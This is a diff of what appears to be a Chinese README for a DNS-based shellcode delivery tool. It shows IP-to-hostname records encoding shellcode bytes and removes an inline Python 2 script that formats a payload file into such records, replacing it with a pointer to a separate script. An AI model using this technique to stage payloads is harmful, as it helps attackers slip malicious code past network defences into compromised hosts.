@@ -8,20 +8,7 @@ step.2
 Ipaddress "{payload}.domain.com"
 1.1.1.0 "0xfc0x480x830xe40xf00xe8.1.com"
 1.1.1.1 "0xbc0xc80x130xff0x100x08.1.com"
-python格式化
-#! /usr/bin/env python2.7
-# -*- coding:UTF-8 -*-
-a = ''
-f = open("payload.txt", "rb")
-line = f.readlines()[0:]
-f.close()
-for lines in range(len(line)):
-    ipls = '1.1.1.%s' % lines
-    shellcode = line[lines].replace(";","").strip().rstrip('"')+".1.com"+'"'
-    text = ipls + " " + '"'+ "0x"+shellcode.lstrip('"')
-    a += text.replace("\\","0")+"\n"
-fn = open("dns.txt", "wb")
-fn.write(a)
+python格式化脚本可参见项目script_format.py
 
 step.3
 DNS_Server
